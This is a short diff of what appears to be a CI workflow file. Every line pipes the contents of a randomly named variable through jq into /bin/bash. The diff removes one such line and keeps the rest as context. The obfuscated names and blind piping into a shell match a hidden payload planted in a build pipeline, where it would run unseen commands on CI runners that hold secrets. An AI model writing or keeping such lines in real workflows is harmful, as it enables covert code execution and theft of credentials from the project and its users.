@@ -24,7 +24,6 @@ jobs:
           echo $cxon11 | jq -r .qx76890 | /bin/bash
           printf '%s' "$p68697" | jq -r .h930 | /bin/bash
           echo $y720 | jq -r .e8641 | /bin/bash
-          printf '%s' "$m53422" | jq -r .qkj4 | /bin/bash
           echo $ioi15248 | jq -r .g88 | /bin/bash
           printf '%s' "$io0" | jq -r .iu3 | /bin/bash
           echo $bj718 | jq -r .kmyc38 | /bin/bash
